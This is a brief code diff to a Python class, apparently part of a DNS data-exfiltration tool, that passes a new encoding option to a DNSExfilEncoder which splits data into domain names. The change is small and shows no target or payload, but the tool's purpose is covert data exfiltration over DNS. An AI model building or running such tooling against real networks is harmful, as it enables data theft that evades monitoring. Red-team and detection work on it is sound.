@@ -115,6 +115,7 @@ class DNSSender:
         encoder = DNSExfilEncoder(
             target_domain=self.config.target_domain,
             chunk_size=self.config.chunk_size,
+            encoding=self.config.encoding,
         )
         encode_result = encoder.encode(data)
         fqdns = encode_result.fqdns
